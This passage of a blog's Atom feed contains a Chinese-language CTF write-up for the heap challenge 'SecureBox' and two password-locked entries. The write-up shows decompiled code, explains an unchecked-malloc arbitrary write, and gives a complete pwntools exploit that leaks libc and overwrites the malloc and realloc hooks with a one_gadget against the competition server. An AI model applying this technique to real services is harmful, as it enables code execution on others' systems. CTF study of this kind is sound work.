    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="1e93152e178c4c2fd3a5c949942d6dcc0068751df8ec56693f52d3cf98cba8cd"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.com/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF pwn: SecureBox</title>
    <link href="https://n0nop.com/2020/04/20/HFCTF-pwn-SecureBox/"/>
    <id>https://n0nop.com/2020/04/20/HFCTF-pwn-SecureBox/</id>
    <published>2020-04-20T10:51:20.000Z</published>
    <updated>2020-05-12T15:21:13.097Z</updated>
    
    <content type="html"><![CDATA[<p>太菜了，MarksMan没有做出来，本地打通了结果远程打不通。后面去做SecureBox，看到Glibc 2.30以为需要了解一些新机制了可能做起来会有些吃力，结果发现还挺简单的。</p><a id="more"></a><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>x64，保护全开：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>常规菜单题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Allocate</span><br><span class="line">2.Delete</span><br><span class="line">3.Enc</span><br><span class="line">4.Show</span><br><span class="line">5.Exit</span><br></pre></td></tr></table></figure><ul><li><code>Allocate</code>功能就是先malloc一块0x28的chunk，然后前0x10字节填充随机密钥，chunk[4]储存输入的size，chunk[3]储存根据输入的size来malloc的数据chunk：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">Allocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _QWORD *v0; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 <span class="built_in">size</span>; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">    v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    v2 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !chunk_array[i] )</span><br><span class="line">        &#123;</span><br><span class="line">        v2 = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"No boxes available!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Size: "</span>);</span><br><span class="line">        <span class="built_in">size</span> = choice();</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0x100</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">size</span> &lt;= <span class="number">0xFFF</span> )  <span class="comment">// size can be very large</span></span><br><span class="line">        &#123;</span><br><span class="line">        chunk_array[v2] = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">        *((_QWORD *)chunk_array[v2] + <span class="number">4</span>) = <span class="built_in">size</span>;  <span class="comment">// very large number</span></span><br><span class="line">        v0 = chunk_array[v2];</span><br><span class="line">        v0[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="built_in">size</span>);     <span class="comment">// return 0 here</span></span><br><span class="line">        <span class="built_in">memset</span>(chunk_array[v2], <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">        read_rand_data(chunk_array[v2]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Key: "</span>);</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02x "</span>, *((<span class="keyword">unsigned</span> __int8 *)chunk_array[v2] + j));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nBox ID: %d\n"</span>, v2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Finish!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>Delete</code>free得很彻底：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">Delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Box ID: "</span>);</span><br><span class="line">    v1 = choice();</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    LABEL_7:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Finish!"</span>);</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_array[v1] )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *((_QWORD *)chunk_array[v1] + <span class="number">3</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">free</span>(*((<span class="keyword">void</span> **)chunk_array[v1] + <span class="number">3</span>));</span><br><span class="line">        *((_QWORD *)chunk_array[v1] + <span class="number">3</span>) = <span class="number">0L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(chunk_array[v1]);</span><br><span class="line">        chunk_array[v1] = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Empty Box!"</span>);</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>Enc</code>功能对输入的<code>index</code>对应的chunk中储存的数据chunk进行编辑，逻辑为输入相应的<code>offset</code>，<code>length</code>，以及<code>data</code>，然后在数据chunk的对应的<code>offset</code>写入<code>length</code>长度的加密的<code>data</code>，这里的加密其实就是使用在<code>Allocate</code>功能中产生的随机0x10字节的密钥进行异或。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">Enc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Box ID: "</span>);</span><br><span class="line">    v2 = choice();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_9:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Finish!"</span>);</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_array[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Offset of msg: "</span>);</span><br><span class="line">        v3 = choice();</span><br><span class="line">        <span class="keyword">if</span> ( *((_QWORD *)chunk_array[v2] + <span class="number">4</span>) &gt; v3 ) <span class="comment">// *((_QWORD *)chunk_array[v2] + 4) is large here</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Len of msg: "</span>);</span><br><span class="line">        v4 = *((_QWORD *)chunk_array[v2] + <span class="number">4</span>) - v3;</span><br><span class="line">        v5 = choice();</span><br><span class="line">        <span class="keyword">if</span> ( v5 &lt;= v4 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Msg: "</span>);</span><br><span class="line">            read_data(*((_QWORD *)chunk_array[v2] + <span class="number">3</span>) + v3, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5);</span><br><span class="line">            v6 = *((_QWORD *)chunk_array[v2] + <span class="number">3</span>) + v3;</span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt; v5; ++i )</span><br><span class="line">            *(_BYTE *)(v6 + i) ^= *((_BYTE *)chunk_array[v2] + (i &amp; <span class="number">0xF</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Empty Box!"</span>);</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>Show</code>功能打印给定<code>index</code>对应chunk中的数据chunk中的数据，根据提供的<code>offset</code>和<code>length</code>。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">Show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST10_8</span></span><br><span class="line">    <span class="keyword">void</span> *dest; <span class="comment">// ST20_8</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 n; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Box ID: "</span>);</span><br><span class="line">    v3 = choice();</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( chunk_array[v3] )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Offset of msg: "</span>);</span><br><span class="line">        v4 = choice();</span><br><span class="line">        <span class="keyword">if</span> ( *((_QWORD *)chunk_array[v3] + <span class="number">4</span>) &gt; v4 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Len of msg: "</span>);</span><br><span class="line">            v0 = *((_QWORD *)chunk_array[v3] + <span class="number">4</span>) - v4;</span><br><span class="line">            n = choice();</span><br><span class="line">            <span class="keyword">if</span> ( n &lt;= v0 )</span><br><span class="line">            &#123;</span><br><span class="line">            dest = <span class="built_in">calloc</span>(n + <span class="number">32</span>, <span class="number">1u</span>LL);</span><br><span class="line">            <span class="built_in">memcpy</span>(dest, (<span class="keyword">const</span> <span class="keyword">void</span> *)(*((_QWORD *)chunk_array[v3] + <span class="number">3</span>) + v4), n);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Msg: "</span>);</span><br><span class="line">            <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)dest);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Empty Box!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul><li>先利用unsorted bin来leak出libc的地址。</li><li>之后关键利用点就在于：<ul><li><code>Allocate</code>功能：其中<code>Allocate</code>的对size的检查逻辑<code>if ( size &gt; 0x100 &amp;&amp; (unsigned int)size &lt;= 0xFFF )</code>使得size可以是形如<code>0x00FFFFFF00000000</code>的很大的数，而进行相应的malloc操作时，会因为size过大而返回NULL也就是0，但是并没有对malloc的结果进行检查。</li><li><code>Enc</code>功能：因为<code>*((_QWORD *)chunk_array[v2] + 4)</code>可以很大（就是输入的size）且<code>*((_QWORD *)chunk_array[v2] + 3)=0</code>（malloc返回的结果），加上没有对<code>*((_QWORD *)chunk_array[v2] + 3)</code>的检查，所以在控制offset为任意地址的情况下，即可以实现向任意地址写任意数据。</li></ul></li><li>根据上述漏洞，首先<code>Allocate</code>一个size为<code>0x00FFFFFF00000000</code>（覆盖所有地址均可）的chunk（返回0），记录生成的<code>key</code>。</li><li><code>Enc</code>前一步申请的chunk，<code>offset</code>设置为<code>__realloc_hook</code>的地址，length的值为0x10。</li><li>将<code>(libc_realloc + 10) &lt;&lt; 64) | one_gadget</code>用<code>key</code>加密（逐字节异或）得到payload，将payload作为输入的data，这样可以将<code>__malloc_hook</code>写入<code>__libc_realloc+10</code>，<code>__realloc_hook</code>写入<code>onegadget</code>，目的是调整栈以满足<code>[rsp]+0x70</code>的约束然后打<code>onegadget</code>。（这里这么做是因为直接改<code>__free_hook</code>为<code>system</code>打不通，直接改<code>__malloc_hook</code>也满足不了约束，所以用<code>__libc_realloc</code>来调整栈。）</li></ul><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'39.97.210.182'</span>, <span class="number">19806</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./chall_2"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"5.Exit"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"5.Exit"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Box ID: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, offset, length, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"5.Exit"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Box ID: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Offset of msg: "</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">"Len of msg: "</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">"Msg: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index, offset, length)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"5.Exit"</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Box ID: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Offset of msg: "</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">"Len of msg: "</span>, str(length))</span><br><span class="line">    p.recvuntil(<span class="string">"Msg: \n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(content, key)</span>:</span></span><br><span class="line">    value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        value |= ((content &amp; <span class="number">0xFF</span>) ^ key[i]) &lt;&lt; (i * <span class="number">8</span>)</span><br><span class="line">        content &gt;&gt;= <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p64(value &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>) + p64(value &gt;&gt; <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x1eab80</span></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">realloc_offset = libc.symbols[<span class="string">"realloc"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x10afa9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment"># chunk 0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># chunk 0</span></span><br><span class="line">view(<span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - main_arena_offset - <span class="number">0x60</span></span><br><span class="line">libc_realloc = libc_base + realloc_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># larget size</span></span><br><span class="line">add(<span class="number">0xFFFFFF00000000</span>) <span class="comment"># chunk 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __malloc_hook</span></span><br><span class="line">p.recvuntil(<span class="string">"Key: "</span>)</span><br><span class="line">keys = p.recv(<span class="number">48</span>)</span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(keys), <span class="number">3</span>):</span><br><span class="line">    print(keys[i:i+<span class="number">3</span>])</span><br><span class="line">    key.append(int(keys[i:i+<span class="number">3</span>], <span class="number">16</span>))</span><br><span class="line">edit(<span class="number">2</span>, str(__malloc_hook - <span class="number">8</span>), <span class="number">16</span>, enc(((libc_realloc + <span class="number">10</span>) &lt;&lt; <span class="number">64</span>) | one_gadget, key))</span><br><span class="line"></span><br><span class="line"><span class="comment"># __malloc_hook</span></span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">success(key)</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_realloc: "</span> + hex(libc_realloc))</span><br><span class="line">success(<span class="string">"__malloc_hook: "</span> + hex(__malloc_hook))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p><code>flag{4b03fb45856021f3415e6451f6cf855d}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;太菜了，MarksMan没有做出来，本地打通了结果远程打不通。后面去做SecureBox，看到Glibc 2.30以为需要了解一些新机制了可能做起来会有些吃力，结果发现还挺简单的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.com/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn rop: unexploitable</title>
    <link href="https://n0nop.com/2020/04/17/pwn-rop-unexploitable/"/>
    <id>https://n0nop.com/2020/04/17/pwn-rop-unexploitable/</id>
    <published>2020-04-17T15:49:50.000Z</published>
    <updated>2020-04-17T16:25:53.199Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="5d3a78db7c708e1ce4180eb585a0da962673d55282d2cb8b1b9f3501326392c2"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.com/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
</feed>
